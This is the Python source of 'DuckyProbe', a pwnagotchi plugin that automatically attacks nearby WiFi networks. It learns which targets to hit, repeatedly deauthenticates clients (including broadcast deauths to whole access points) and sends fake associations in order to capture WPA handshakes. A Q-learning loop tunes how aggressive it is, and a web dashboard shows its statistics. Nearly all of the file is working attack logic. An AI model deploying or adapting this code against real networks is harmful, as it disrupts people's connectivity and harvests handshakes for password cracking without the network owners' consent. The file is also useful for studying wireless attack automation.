import os
import json
import time
import random
import ast
import threading
import tempfile
import logging
import pwnagotchi
from concurrent.futures import ThreadPoolExecutor
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.fonts as fonts
from pwnagotchi.ui.components import Text
from flask import abort, render_template_string
import html


class DuckyProbe(plugins.Plugin):
    __author__ = '0x0ffed (adapted)'
    __version__ = '1.2.0'
    __license__ = 'GPL3'
    __description__ = 'Learns. Scores. Probes. Q-driven.'

    def __init__(self):
        self.memory_path = '/etc/pwnagotchi/duckyprobe.json'
        self.qtable_path = '/etc/pwnagotchi/duckyprobe_brain.json'
        self.aps = {}
        self.qtable = {}
        self.executor = ThreadPoolExecutor(max_workers=50)
        self.ui_elements_added = False
        self.whitelist_macs = set()
        self.whitelist_names = set()
        self.current_recon = (10, 5, 20)
        self.epsilon = 0.1
        self.learning_rate = 0.7
        self.discount_factor = 0.9
        self.session_handshakes = 0
        self.last_handshakes = 0

        # Match labels to the actual action tuples used in the Q-table
        self.RECON_LABELS = {
            (10, 5, 20): "LITE",
            (20, 10, 30): "STEALTH",
            (30, 20, 40): "AGGRSV",
            (15, 5, 25): "GREED",
        }

        self.fake_auth_prob = 0.4
        self.broadcast_deauth_prob = 0.2
        self.fake_auth_delay_factor = 0.5
        self.client_expiry = 3600 * 24
        self.ap_expiry = 3600 * 48
        self.lock = threading.Lock()
        self.default_channels = list(range(1, 15))
        self.min_attack_delay = 0.02

    def _ensure_data_dir(self):
        try:
            data_dir = os.path.dirname(self.memory_path)
            if data_dir:
                os.makedirs(data_dir, exist_ok=True)
        except Exception as e:
            logging.error(f"[duckyprobe] Failed to ensure data directory: {e}")

    def _load_memory(self):
        try:
            if os.path.exists(self.memory_path):
                with open(self.memory_path, 'r') as f:
                    self.aps = json.load(f)
                logging.info(f"[duckyprobe] Loaded memory with {len(self.aps)} APs")

            if os.path.exists(self.qtable_path):
                with open(self.qtable_path, 'r') as f:
                    self.qtable = json.load(f)
                logging.info("[duckyprobe] Q-table loaded")

            # Convert stringified tuples back to tuples safely
            self.qtable = {ast.literal_eval(k): v for k, v in self.qtable.items()}
            for state in self.qtable:
                self.qtable[state] = {ast.literal_eval(k): v for k, v in self.qtable[state].items()}

        except Exception as e:
            logging.error(f"[duckyprobe] Failed to load memory: {e}")
            self.aps = {}
            self.qtable = {}

    def _save_memory(self):
        try:
            qtable_to_save = {str(k): {str(a): v for a, v in actions.items()}
                              for k, actions in self.qtable.items()}

            for path, data in [(self.memory_path, self.aps),
                               (self.qtable_path, qtable_to_save)]:
                with tempfile.NamedTemporaryFile('w', delete=False) as tmp:
                    json.dump(data, tmp, indent=2)
                    tmp.flush()
                    os.fsync(tmp.fileno())
                os.replace(tmp.name, path)

        except Exception as e:
            logging.error(f"[duckyprobe] Failed to save memory: {e}")

    def _cleanup_memory(self):
        now = time.time()
        with self.lock:
            expired_aps = [ap for ap, data in self.aps.items()
                           if now - data.get("last_seen", 0) > self.ap_expiry]
            for ap in expired_aps:
                del self.aps[ap]

            for ap_data in self.aps.values():
                clients = ap_data.get("clients", {})
                expired_clients = [mac for mac, client in clients.items()
                                   if now - client.get("last_seen", 0) > self.client_expiry]
                for mac in expired_clients:
                    del clients[mac]

    def _load_whitelist(self):
        self.whitelist_macs.clear()
        self.whitelist_names.clear()
        raw_list = self.options.get("main", {}).get("whitelist", [])
        for entry in raw_list:
            entry = entry.strip().lower()
            if ':' in entry:
                self.whitelist_macs.add(entry)
            else:
                self.whitelist_names.add(entry)

    def _is_whitelisted(self, mac, ssid):
        mac = mac.strip().lower()
        ssid = ssid.strip().lower() if ssid else ""
        return mac in self.whitelist_macs or ssid in self.whitelist_names

    def _update_ap(self, ap_mac, channel=None, ssid=None):
        with self.lock:
            if ap_mac not in self.aps:
                self.aps[ap_mac] = {
                    "ssid": ssid,
                    "clients": {},
                    "last_seen": time.time(),
                    "channel": channel,
                    "attempts": 0,
                    "handshakes": 0,
                    "cooldown": 0,
                    "recon": self.current_recon,
                    "vendor": "unknown"
                }
            else:
                self.aps[ap_mac]["last_seen"] = time.time()
                if channel is not None:
                    self.aps[ap_mac]["channel"] = channel
                if ssid:
                    self.aps[ap_mac]["ssid"] = ssid

    def _update_client(self, ap_mac, client_mac, signal=-100, vendor="unknown"):
        self._update_ap(ap_mac)
        with self.lock:
            clients = self.aps[ap_mac]["clients"]
            if client_mac not in clients:
                clients[client_mac] = {
                    "attempts": 0,
                    "last_attempt": 0,
                    "last_success": 0,
                    "last_seen": time.time(),
                    "response_time": None,
                    "score": 0,
                    "signal": signal,
                    "vendor": vendor if vendor != "unknown" else "unknown",
                }
            else:
                clients[client_mac]["last_seen"] = time.time()
                clients[client_mac]["signal"] = signal
                # Do not overwrite a known vendor with 'unknown'
                if vendor != "unknown":
                    clients[client_mac]["vendor"] = vendor
            self._recalculate_score(ap_mac, client_mac)

    def _recalculate_score(self, ap_mac, client_mac):
        c = self.aps[ap_mac]["clients"][client_mac]
        age = time.time() - c["last_seen"]
        signal = c.get("signal", -100)
        attempts = c["attempts"]
        successes = 1 if c["last_success"] > 0 else 0

        signal_factor = max(0, (signal + 80) / 20)
        activity_factor = 1 + (1 / (age + 60))
        score = ((signal_factor * 100) + (successes * 200)) - ((attempts * 1) * activity_factor)
        c["score"] = max(score, 0)

    def _should_attack(self, ap_mac, client_mac):
        with self.lock:
            ap = self.aps.get(ap_mac)
            ssid = ap.get("ssid", "Hidden") if ap else ""
            if self._is_whitelisted(ap_mac, ssid):
                return False

            if not ap:
                return True

            if time.time() < ap.get("cooldown", 0):
                return random.random() < 0.5

            c = ap["clients"].get(client_mac)
            if not c:
                return True

            if time.time() - c["last_success"] < 300:
                return random.random() < 0.3

            if c["attempts"] >= 50:
                return random.random() < 0.5

            return True

    def _calculate_delay(self, attempts, last_success=0):
        base_delay = max(self.min_attack_delay, 0.05 * (0.8 ** min(attempts, 10)))
        if last_success and (time.time() - last_success) < 1800:
            base_delay *= 0.5
        return base_delay

    def _execute_attack(self, agent, ap, client):
        try:
            ap_mac = ap["mac"].lower()
            client_mac = client["mac"].lower() if client else "ff:ff:ff:ff:ff:ff"
            ssid = ap.get("hostname") or ap.get("essid") or "Hidden"
            vendor = client.get("vendor", "unknown") if client else "unknown"
            signal = client.get("signal", -100) if client else -100

            if self._is_whitelisted(ap_mac, ssid):
                logging.debug(f"[duckyprobe] Skipping whitelisted target: {ssid} ({ap_mac})")
                return

            self._update_client(ap_mac, client_mac, signal, vendor)

            with self.lock:
                ap_data = self.aps.get(ap_mac)
                if not ap_data:
                    logging.warning(f"[duckyprobe] AP {ap_mac} not tracked; skipping attack")
                    return
                client_data = ap_data["clients"].get(client_mac)
                if not client_data:
                    logging.warning(f"[duckyprobe] Client {client_mac} not tracked under {ap_mac}; skipping")
                    return

                all_scores = [
                    c["score"]
                    for ap in self.aps.values()
                    for c in ap.get("clients", {}).values()
                    if "score" in c
                ]
                if all_scores:
                    dynamic_threshold = sorted(all_scores)[int(0.6 * len(all_scores))]
                else:
                    dynamic_threshold = 50

                if client_data["score"] < dynamic_threshold:
                    logging.debug(f"[duckyprobe] Skipping low-score target {client_mac} ({client_data['score']:.2f} < dyn {dynamic_threshold:.2f})")
                    return

                ap_data["attempts"] += 1
                client_data["attempts"] += 1
                client_data["last_attempt"] = time.time()

            delay = self._calculate_delay(client_data["attempts"], client_data["last_success"])

            if ap_data["channel"] is not None:
                agent.set_channel(ap_data["channel"])

            logging.info(f"[duckyprobe] Attacking {client_mac} ({vendor}) on {ssid} ({ap_mac}) score={client_data['score']:.2f}")

            agent.deauth(ap, client, delay)
            if random.random() < self.fake_auth_prob:
                time.sleep(0.01)
                agent.associate(ap, delay * self.fake_auth_delay_factor)

        except Exception as e:
            logging.error(f"[duckyprobe] Attack failed: {e}")

    def _delayed_retry_attack(self, agent, ap, client, delay):
        try:
            time.sleep(random.uniform(0.5, 1.5))
            agent.deauth(ap, client, delay)
            if random.random() < 0.7:
                time.sleep(0.1)
                agent.associate(ap, delay * 0.3)
        except Exception as e:
            logging.error(f"[duckyprobe] Retry attack failed: {e}")

    def _q_learn(self, blind, handshakes):
        try:
            time_bucket = (int(time.time()) % 86400) // 3600

            global_state = (blind, len(self.aps), sum(len(ap["clients"]) for ap in self.aps.values()), time_bucket)

            if global_state not in self.qtable:
                self.qtable[global_state] = {
                    (10, 5, 20): random.uniform(-0.1, 0.1),
                    (20, 10, 30): random.uniform(-0.1, 0.1),
                    (30, 20, 40): random.uniform(-0.1, 0.1),
                    (15, 5, 25): random.uniform(-0.1, 0.1)
                }

            delta_handshakes = handshakes - self.last_handshakes
            reward = (delta_handshakes * 10) - (blind * 2)
            self.last_handshakes = handshakes

            for action in self.qtable[global_state]:
                self.qtable[global_state][action] *= 0.99

            current_q = self.qtable[global_state][self.current_recon]
            max_future_q = max(self.qtable[global_state].values())
            updated_q = current_q + self.learning_rate * (
                reward + self.discount_factor * max_future_q - current_q
            )
            self.qtable[global_state][self.current_recon] = updated_q

            if random.random() < self.epsilon:
                self.current_recon = random.choice(list(self.qtable[global_state].keys()))
            else:
                self.current_recon = max(self.qtable[global_state], key=self.qtable[global_state].get)

            for ap_mac, ap in self.aps.items():
                num_clients = len(ap["clients"])
                ap_state = (blind, 1, num_clients, time_bucket)

                if ap_state not in self.qtable:
                    self.qtable[ap_state] = {
                        (10, 5, 20): random.uniform(-0.1, 0.1),
                        (20, 10, 30): random.uniform(-0.1, 0.1),
                        (30, 20, 40): random.uniform(-0.1, 0.1),
                        (15, 5, 25): random.uniform(-0.1, 0.1)
                    }

                prev_handshakes = ap.get("prev_handshakes", 0)
                curr_handshakes = ap.get("handshakes", 0)
                delta = curr_handshakes - prev_handshakes
                ap["prev_handshakes"] = curr_handshakes

                reward = (delta * 10) - (blind * 2)

                for action in self.qtable[ap_state]:
                    self.qtable[ap_state][action] *= 0.99

                current_q = self.qtable[ap_state].get(ap.get("recon", self.current_recon), 0)
                max_q = max(self.qtable[ap_state].values())
                updated_q = current_q + self.learning_rate * (reward + self.discount_factor * max_q - current_q)
                recon_action = ap.get("recon", self.current_recon)
                self.qtable[ap_state][recon_action] = updated_q

                if random.random() < self.epsilon:
                    ap["recon"] = random.choice(list(self.qtable[ap_state].keys()))
                else:
                    ap["recon"] = max(self.qtable[ap_state], key=self.qtable[ap_state].get)

            if len(self.qtable) > 1000:
                oldest = sorted(self.qtable.items(), key=lambda x: x[0][3])[:100]
                for s, _ in oldest:
                    if s != global_state:
                        del self.qtable[s]

            self._save_memory()

        except Exception as e:
            logging.error(f"[duckyprobe] Q-learning failed: {e}")

    def _select_optimal_channel(self):
        try:
            channel_stats = {}
            for ap_mac, ap in self.aps.items():
                ch = ap.get("channel")
                if ch is None:
                    continue

                if ch not in channel_stats:
                    channel_stats[ch] = {"aps": 0, "clients": 0, "handshakes": 0}

                channel_stats[ch]["aps"] += 1
                channel_stats[ch]["clients"] += len(ap["clients"])
                channel_stats[ch]["handshakes"] += ap["handshakes"]

            if not channel_stats:
                return random.choice(self.default_channels)

            weights = {
                ch: (stats["handshakes"] * 10) + stats["clients"]
                for ch, stats in channel_stats.items()
            }
            return random.choices(list(weights.keys()), weights=list(weights.values()), k=1)[0]

        except Exception as e:
            logging.error(f"[duckyprobe] Channel selection failed: {e}")
            return random.choice(self.default_channels)

    def _broadcast_deauth(self, agent):
        try:
            now = time.time()
            for ap_mac, ap in self.aps.items():
                if (
                    not ap.get("clients")
                    and ap.get("handshakes", 0) == 0
                    and now - ap.get("last_seen", 0) < 300
                ):
                    if random.random() < self.broadcast_deauth_prob:
                        agent.set_channel(ap["channel"])
                        broadcast_client = {"mac": "ff:ff:ff:ff:ff:ff", "signal": -100}
                        agent.deauth({"mac": ap_mac}, broadcast_client, 0.1)
                        logging.info(f"[duckyprobe] Broadcast deauth sent to {ap_mac}")
                    else:
                        logging.debug(f"[duckyprobe] Skipped broadcast deauth to {ap_mac} (rate limited)")
        except Exception as e:
            logging.error(f"[duckyprobe] Broadcast deauth failed: {e}")

    def _render_main_page(self):
        try:
            recon_mode = self.RECON_LABELS.get(self.current_recon, str(self.current_recon))
            handshakes = getattr(self, 'session_handshakes', 0)
            total_aps = len(getattr(self, 'aps', {}))
            total_clients = sum(len(ap.get('clients', {})) for ap in getattr(self, 'aps', {}).values())

            qtable_html = self._generate_qtable_html()

            graph_content = self._generate_learning_graph_content()

            html_content = f"""
            <html>
            <head>
                <title>DuckyProbe Dashboard</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        margin: 20px;
                    }}
                    .dashboard {{
                        display: grid;
                        grid-template-columns: 1fr 1fr;
                        gap: 20px;
                    }}
                    .card {{
                        border: 1px solid #ccc;
                        padding: 15px;
                        border-radius: 5px;
                        margin-bottom: 20px;
                    }}
                    table {{
                        width: 100%;
                        border-collapse: collapse;
                        margin-bottom: 15px;
                    }}
                    th, td {{
                        border: 1px solid #ddd;
                        padding: 8px;
                        text-align: left;
                    }}
                    th {{
                        background-color: #f2f2f2;
                    }}
                    .state {{
                        font-family: monospace;
                    }}
                    .best {{
                        background-color: #e6ffe6;
                    }}
                    pre {{
                        font-family: monospace;
                        white-space: pre;
                        background: #f5f5f5;
                        padding: 10px;
                        border-radius: 5px;
                        overflow-x: auto;
                    }}
                    .graph-container {{
                        margin-top: 20px;
                    }}
                    h1, h2 {{
                        color: #333;
                    }}
                </style>
            </head>
            <body>
                <h1>DuckyProbe Learning Dashboard</h1>

                <div class="dashboard">
                    <div>
                        <div class="card">
                            <h2>Quick Stats</h2>
                            <p>Current Mode: <strong>{html.escape(recon_mode)}</strong></p>
                            <p>Session Handshakes: <strong>{handshakes}</strong></p>
                            <p>Total APs Tracked: <strong>{total_aps}</strong></p>
                            <p>Total Clients Tracked: <strong>{total_clients}</strong></p>
                        </div>

                        <div class="card">
                            <h2>Learning Parameters</h2>
                            <p>Learning Rate: <strong>{getattr(self, 'learning_rate', 0.5)}</strong></p>
                            <p>Discount Factor: <strong>{getattr(self, 'discount_factor', 0.8)}</strong></p>
                            <p>Exploration Rate: <strong>{getattr(self, 'epsilon', 0.2)}</strong></p>
                        </div>

                        <div class="card">
                            <h2>Learning Progress</h2>
                            <div class="graph-container">
                                <pre>{graph_content}</pre>
                            </div>
                        </div>
                    </div>

                    <div>
                        <div class="card">
                            <h2>Q-table Summary</h2>
                            {qtable_html}
                        </div>
                    </div>
                </div>
            </body>
            </html>
            """
            return html_content

        except Exception as e:
            error_msg = f"Error rendering dashboard: {str(e)}"
            logging.error(f"[duckyprobe] {error_msg}")
            return f"<html><body><h1>Error</h1><pre>{html.escape(error_msg)}</pre></body></html>"

    def _generate_qtable_html(self):
        try:
            if not self.qtable:
                return "<p>No Q-table data available yet</p>"

            sorted_states = sorted(self.qtable.items(),
                                   key=lambda x: max(x[1].values()) if x[1] else 0,
                                   reverse=True)[:10]

            rows = []
            for state, actions in sorted_states:
                row = f"<tr><td class='state'>{state[0]}...</td>"
                for action in [(10, 5, 20), (20, 10, 30), (30, 20, 40), (15, 5, 25)]:
                    value = actions.get(action, 0)
                    best_action = max(actions, key=actions.get) if actions else None
                    cell_class = "class='best'" if action == best_action else ""
                    row += f"<td {cell_class}>{value:.2f}</td>"
                row += "</tr>"
                rows.append(row)

            rows_content = '\n'.join(rows)

            return f"""
            <table>
                <tr>
                    <th>Blind Epochs</th>
                    <th>LITE</th>
                    <th>STEALTH</th>
                    <th>AGGRSV</th>
                    <th>GREED</th>
                </tr>
                {rows_content}
            </table>
            <p><small>Showing top {len(sorted_states)} of {len(self.qtable)} states</small></p>
            """
        except Exception as e:
            return f"<p>Error generating Q-table: {html.escape(str(e))}</p>"

    def _generate_learning_graph_content(self):
        try:
            if not self.qtable:
                return "No learning data yet"

            states = sorted(self.qtable.items(), key=lambda x: x[0][0])[-20:]

            all_values = [max(actions.values()) for _, actions in states]
            max_q = max(all_values) if all_values else 1
            min_q = min(all_values) if all_values else 0
            range_q = max(0.1, max_q - min_q)

            graph_lines = [
                f"Learning Progress (Last {len(states)} States):",
                f"Max Q: {max_q:.2f} | Min Q: {min_q:.2f}",
                ""
            ]

            graph_height = 10
            for i in range(graph_height, 0, -1):
                y_value = min_q + (i - 1) * (range_q / graph_height)
                line = f"{y_value:6.2f} |"

                for _, actions in states:
                    value = max(actions.values())
                    y_pos = int(((value - min_q) / range_q) * graph_height)

                    if y_pos >= i:
                        line += "#"
                    elif y_pos == i - 1:
                        line += "."
                    else:
                        line += " "

                graph_lines.append(line)

            graph_lines.append("       " + "+" + "-" * len(states))
            x_labels = "        "
            for i, (state, _) in enumerate(states):
                x_labels += "^" if i % 5 == 0 else " "
            graph_lines.extend([x_labels, "       Blind Epochs"])

            return '\n'.join(graph_lines)

        except Exception as e:
            return f"Error generating graph: {str(e)}"

    def on_webhook(self, path, request):
        try:
            if request.method == "GET":
                if path == "/" or not path:
                    return self._render_main_page()

            return ("<h1>404 Not Found</h1>", 404)

        except Exception as e:
            error_msg = f"Error processing request: {str(e)}"
            logging.error(f"[duckyprobe] Webhook error: {error_msg}")
            return (f"<h1>Error</h1><pre>{html.escape(error_msg)}</pre>", 500)

    def on_loaded(self):
        try:
            # Allow basic configuration overrides
            opts = self.options.get("main", {})
            self.memory_path = opts.get("memory_path", self.memory_path)
            self.qtable_path = opts.get("qtable_path", self.qtable_path)
            max_workers = int(opts.get("max_workers", 50))

            # Recreate executor if configured max_workers differs
            if max_workers > 0:
                try:
                    if getattr(self.executor, '_max_workers', None) != max_workers:
                        self.executor.shutdown(wait=False)
                        self.executor = ThreadPoolExecutor(max_workers=max_workers)
                except Exception:
                    pass

            self._ensure_data_dir()
            self._load_memory()
            self._load_whitelist()
            logging.info("[duckyprobe] Loaded with web UI at /plugins/duckyprobe/")
        except Exception as e:
            logging.error(f"[duckyprobe] Error during loading: {str(e)}")

    def on_unload(self, ui):
        self._save_memory()
        self.executor.shutdown(wait=False)
        if self.ui_elements_added:
            ui.remove_element('duckyprobe_stats')
        logging.info("[duckyprobe] Unloaded")

    def on_ui_setup(self, ui):
        ui.add_element('duckyprobe_stats', Text(position=(195, 109), value="", color=0, font=fonts.Bold))
        self.ui_elements_added = True

    def on_ui_update(self, ui):
        if not self.ui_elements_added:
            return

        if self.aps:
            latest_ap = max(self.aps.items(), key=lambda x: x[1]['last_seen'])[1]
            recon = latest_ap.get('recon', self.current_recon)
        else:
            recon = self.current_recon

        recon_key = tuple(map(int, recon))
        recon_label = self.RECON_LABELS.get(recon_key, "DUCKY")
        ui.set('duckyprobe_stats', recon_label)

    def on_bcap_wifi_ap_new(self, agent, event):
        ap = event["data"]
        ap_mac = ap["mac"].lower()
        ssid = ap.get("hostname") or ap.get("essid") or "Hidden"
        self._update_ap(ap_mac, ap.get("channel"), ssid)
        logging.info(f"[duckyprobe] New AP: {ssid} ({ap_mac}) on channel {ap.get('channel')}")

    def on_bcap_wifi_client_new(self, agent, event):
        ap = event["data"]["AP"]
        client = event["data"]["Client"]
        ap_mac = ap["mac"].lower()
        client_mac = client["mac"].lower()
        vendor = client.get("vendor", "unknown")
        self._update_client(ap_mac, client_mac, client.get("signal", -100), vendor)
        if self._should_attack(ap_mac, client_mac):
            for _ in range(2):
                self.executor.submit(self._execute_attack, agent, ap, client)

    def on_handshake(self, agent, filename, ap, client):
        ap_mac = ap["mac"].lower()
        client_mac = client["mac"].lower() if client else "ff:ff:ff:ff:ff:ff"
        if ap_mac in self.aps and client_mac in self.aps[ap_mac]["clients"]:
            with self.lock:
                client_data = self.aps[ap_mac]["clients"][client_mac]
                client_data["last_success"] = time.time()
                client_data["response_time"] = time.time() - client_data["last_attempt"]
                self.aps[ap_mac]["handshakes"] += 1
                self.aps[ap_mac]["cooldown"] = time.time() + 60
                self.session_handshakes += 1
            logging.info(f"[duckyprobe] Handshake captured from {client_mac} on {ap_mac}")
            self.executor.submit(self._execute_attack, agent, ap, client)

    def on_epoch(self, agent, epoch, epoch_data):
        self._cleanup_memory()
        self._q_learn(blind=epoch_data.get("blind", 0), handshakes=self.session_handshakes)

        self._broadcast_deauth(agent)

        best_channel = self._select_optimal_channel()
        agent.set_channel(best_channel)
        logging.info(f"[duckyprobe] Switched to optimal channel {best_channel}")

        self._save_memory()

